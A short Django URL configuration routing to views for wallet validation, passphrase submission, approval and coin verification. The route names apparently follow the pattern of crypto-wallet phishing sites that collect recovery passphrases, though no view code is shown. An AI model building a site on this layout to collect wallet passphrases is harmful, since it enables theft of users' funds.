from django.urls import path
from . import views

urlpatterns = [
    path('', views.index, name='home'),
    path('validate/', views.validate, name='validate'),
    path('wallet/', views.wallet, name="wallet"),
    path('submit/passphase/', views.submit_pass, name="submit_pass"),
    path('approve/', views.approve, name='approve'),
    path('verify/', views.verify_your_coin, name='verify')
]
